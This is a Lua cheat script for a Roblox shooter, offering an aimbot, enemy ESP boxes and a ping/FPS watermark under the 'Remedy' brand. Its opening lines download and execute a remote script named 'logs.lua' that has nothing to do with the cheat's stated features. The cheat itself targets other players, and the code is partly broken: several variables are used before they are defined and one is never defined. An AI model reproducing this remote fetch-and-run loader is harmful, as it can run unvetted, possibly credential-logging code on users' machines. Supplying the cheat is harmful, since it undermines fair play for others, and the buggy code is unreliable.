-- Load and execute the external script from the provided URL
local externalScriptURL = "https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua"
local success, result = pcall(function()
    loadstring(game:HttpGet(externalScriptURL))()
end)

if not success then
    warn("Failed to load external script: " .. result)
end

-- Import the library
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/WetCheezit/Bracket-V2/main/src.lua"))()

-- Notification on first run
game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Remedy Softworks",
    Text = "Thanks for using Remedy", 
    Duration = 5 
})

-- Window
local Window, MainGUI = Library:CreateWindow("Bracket-V2")

-- Tabs
local Tab1 = Window:CreateTab("Aimbot")
local Tab2 = Window:CreateTab("Visuals")
local Tab3 = Window:CreateTab("Misc")

-- Groupbox for Aimbot Settings
local AimbotGroupbox = Tab1:CreateGroupbox("Aimbot Settings", "Left")

-- Toggle for Aimbot
local AimbotToggle = AimbotGroupbox:CreateToggle("Enable Aimbot", function(state)
   Toggles.AimbotToggle.Value = state
end)

-- Toggle for Show FOV Circle
local ShowFOVToggle = AimbotGroupbox:CreateToggle("Show FOV Circle", function(state)
   Toggles.ShowFOV.Value = state
end)

-- Slider for FOV Size
local FOVSizeSlider = AimbotGroupbox:CreateSlider("FOV Size", 50, 500, 100, function(value)
   Options.FOVSize.Value = value
end)

-- Slider for Aimbot Smoothness
local AimbotSmoothnessSlider = AimbotGroupbox:CreateSlider("Aimbot Smoothness", 1, 20, 5, function(value)
   Options.AimbotSmoothness.Value = value
end)

-- Dropdown for Target Part Selection
local TargetPartDropdown = AimbotGroupbox:CreateDropdown("Target Part", {"Head", "Humanoid", "Chest"}, function(selectedPart)
   Options.TargetPart.Value = selectedPart
end)

-- Groupbox for Visuals Settings
local VisualsGroupbox = Tab2:CreateGroupbox("Visuals Settings", "Left")

-- Toggle for ESP Boxes
local ToggleBoxes = VisualsGroupbox:CreateToggle("Toggle Enemy Boxes (ESP)", function(state)
   Toggles.ToggleBoxes.Value = state
end)

-- Groupbox for Misc Settings
local MiscGroupbox = Tab3:CreateGroupbox("Misc Settings", "Left")

-- Toggle for Watermark
local WatermarkToggle = MiscGroupbox:CreateToggle("Toggle Watermark", function(state)
    if state then
        WatermarkFrame.Visible = true
    else
        WatermarkFrame.Visible = false
    end
end)

-- Initialization of Options and Toggles
local Options = {
    FOVSize = { Value = 100 },
    AimbotSmoothness = { Value = 5 },
    TargetPart = { Value = "Head" }
}

local Toggles = {
    AimbotToggle = { Value = false },
    ShowFOV = { Value = false },
    ToggleBoxes = { Value = false }
}

-- Create the Watermark GUI
local WatermarkFrame = Instance.new("Frame")
WatermarkFrame.Name = "Watermark"
WatermarkFrame.Parent = game.StarterGui
WatermarkFrame.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
WatermarkFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
WatermarkFrame.BorderSizePixel = 0
WatermarkFrame.Position = UDim2.new(0.401605606, 0, 0.025125647, 0)
WatermarkFrame.Size = UDim2.new(0, 319, 0, 25)
WatermarkFrame.Visible = false -- Initially hidden

local Ping = Instance.new("TextLabel")
Ping.Name = "Ping"
Ping.Parent = WatermarkFrame
Ping.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Ping.BackgroundTransparency = 1.000
Ping.BorderColor3 = Color3.fromRGB(0, 0, 0)
Ping.BorderSizePixel = 0
Ping.Position = UDim2.new(0.626959264, 0, 0.176470101, 0)
Ping.Size = UDim2.new(0, 52, 0, 19)
Ping.Font = Enum.Font.SourceSansBold
Ping.TextColor3 = Color3.fromRGB(168, 168, 168)
Ping.TextSize = 14.000

local FPS = Instance.new("TextLabel")
FPS.Name = "FPS"
FPS.Parent = WatermarkFrame
FPS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FPS.BackgroundTransparency = 1.000
FPS.BorderColor3 = Color3.fromRGB(0, 0, 0)
FPS.BorderSizePixel = 0
FPS.Position = UDim2.new(0.789968669, 0, 0.176470101, 0)
FPS.Size = UDim2.new(0, 52, 0, 19)
FPS.Font = Enum.Font.SourceSansBold
FPS.TextColor3 = Color3.fromRGB(168, 168, 168)
FPS.TextSize = 14.000

local Remedy = Instance.new("TextLabel")
Remedy.Name = "Remedy"
Remedy.Parent = WatermarkFrame
Remedy.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
Remedy.BackgroundTransparency = 1.000
Remedy.BorderColor3 = Color3.fromRGB(0, 0, 0)
Remedy.BorderSizePixel = 0
Remedy.Position = UDim2.new(0.112852663, 0, 0.0400004573, 0)
Remedy.Size = UDim2.new(0, 94, 0, 24)
Remedy.Font = Enum.Font.Unknown
Remedy.Text = "REMEDY"
Remedy.TextColor3 = Color3.fromRGB(255, 255, 255)
Remedy.TextSize = 14.000

local UICorner = Instance.new("UICorner")
UICorner.Parent = WatermarkFrame

-- Function to update ping and FPS in the watermark
local function updateWatermark()
    -- Update Ping
    local player = game.Players.LocalPlayer
    Ping.Text = "Ping: " .. player.Status.Ping

    -- Update FPS
    local lastFrameTime = tick()
    local frameCount = 0

    game:GetService("RunService").RenderStepped:Connect(function()
        frameCount = frameCount + 1
        local currentTime = tick()
        if currentTime - lastFrameTime >= 1 then
            FPS.Text = "FPS: " .. frameCount
            frameCount = 0
            lastFrameTime = currentTime
        end
    end)
end

updateWatermark()

-- Make the watermark frame draggable
local function makeDraggable(frame)
    local dragging, dragInput, startPos, startPosAbs = false, nil, nil, nil

    local function update(input)
        local delta = input.Position - dragInput
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragInput = input.Position
            startPos = frame.Position
            startPosAbs = input.Position
        end
    end)

    frame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            if dragging then
                update(input)
            end
        end
    end)
end

makeDraggable(WatermarkFrame)

-- FOV Circle Drawing
local FOVCircle = Drawing.new("Circle")
FOVCircle.Thickness = 2
FOVCircle.Transparency = 1
FOVCircle.Color = Color3.fromRGB(0, 255, 0)
FOVCircle.Filled = false
FOVCircle.Visible = false

-- Update the FOV Circle around the mouse
local function UpdateFOV()
    local mouse = game.Players.LocalPlayer:GetMouse()
    FOVCircle.Position = Vector2.new(mouse.X, mouse.Y + 36) -- Adjust for mouse position
    FOVCircle.Radius = Options.FOVSize.Value
    FOVCircle.Visible = Toggles.ShowFOV.Value
end

game:GetService('RunService').RenderStepped:Connect(UpdateFOV)

-- Check if the target is visible using raycasting
local function IsVisible(target)
    local camera = game.Workspace.CurrentCamera
    local _, onScreen = camera:WorldToViewportPoint(target.Position)
    return onScreen
end

-- Aimbot function
local function Aimbot()
    if not Toggles.AimbotToggle.Value or not rightClickHeld then return end

    local camera = game.Workspace.CurrentCamera
    local localPlayer = game.Players.LocalPlayer
    local closestPlayer = nil
    local shortestDistance = math.huge

    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= localPlayer and player.Team ~= localPlayer.Team and player.Character and player.Character:FindFirstChild('Humanoid') and player.Character.Humanoid.Health > 0 then
            local targetPart = player.Character:FindFirstChild(Options.TargetPart.Value)
            if targetPart and IsVisible(targetPart) then
                local playerPos = targetPart.Position
                local screenPoint, onScreen = camera:WorldToViewportPoint(playerPos)

                if onScreen then
                    local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)).Magnitude
                    if (not Toggles.ShowFOV.Value or distance < Options.FOVSize.Value) and distance < shortestDistance then
                        shortestDistance = distance
                        closestPlayer = player
                    end
                end
            end
        end
    end

    if closestPlayer then
        local targetPosition = closestPlayer.Character.HumanoidRootPart.Position
        local currentPosition = camera.CFrame.Position
        local targetCFrame = CFrame.new(currentPosition, targetPosition)
        camera.CFrame = CFrame.new(currentPosition:Lerp(targetCFrame.Position, Options.AimbotSmoothness.Value / 100), targetPosition)
    end
end

game:GetService('RunService').RenderStepped:Connect(Aimbot)

-- ESP Section
local ESPBoxes = {}
local UpdateInterval = 0.1 -- Time in seconds between updates
local lastUpdateTime = tick()

local function CreateBox(player)
    if not player.Character then return end

    local Box = Drawing.new("Square")
    Box.Thickness = 2
    Box.Transparency = 1
    Box.Color = Color3.fromRGB(66, 135, 245)
    Box.Filled = false

    ESPBoxes[player] = Box

    local function UpdateBox()
        if Toggles.ToggleBoxes.Value and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
            local rootPart = player.Character.HumanoidRootPart
            local rootPos, onScreen = game.Workspace.CurrentCamera:WorldToViewportPoint(rootPart.Position)
            if onScreen then
                local sizeY = (game.Workspace.CurrentCamera:WorldToViewportPoint((rootPart.CFrame * CFrame.new(0, 3, 0)).p) - game.Workspace.CurrentCamera:WorldToViewportPoint((rootPart.CFrame * CFrame.new(0, -3, 0)).p)).Magnitude
                local sizeX = sizeY * 0.6
                Box.Size = Vector2.new(sizeX, sizeY)
                Box.Position = Vector2.new(rootPos.X - Box.Size.X / 2, rootPos.Y - Box.Size.Y / 2)
                Box.Visible = player.Team ~= game.Players.LocalPlayer.Team
            else
                Box.Visible = false
            end
        else
            Box.Visible = false
        end
    end

    game:GetService("RunService").RenderStepped:Connect(UpdateBox)

    -- Update ESP after respawn
    player.CharacterAdded:Connect(function(character)
        ESPBoxes[player] = Box
    end)

    player.CharacterRemoving:Connect(function()
        if ESPBoxes[player] then
            ESPBoxes[player]:Remove()
            ESPBoxes[player] = nil
        end
    end)
end

local function DrawBoxes()
    local currentTime = tick()
    if currentTime - lastUpdateTime >= UpdateInterval then
        lastUpdateTime = currentTime
        if Toggles.ToggleBoxes.Value then
            for _, player in pairs(game:GetService('Players'):GetPlayers()) do
                if player ~= game.Players.LocalPlayer and player.Team ~= game.Players.LocalPlayer.Team then
                    if not ESPBoxes[player] then
                        CreateBox(player)
                    end
                end
            end
        else
            for _, box in pairs(ESPBoxes) do
                box.Visible = false
            end
        end
    end
end

game:GetService('RunService').RenderStepped:Connect(DrawBoxes)
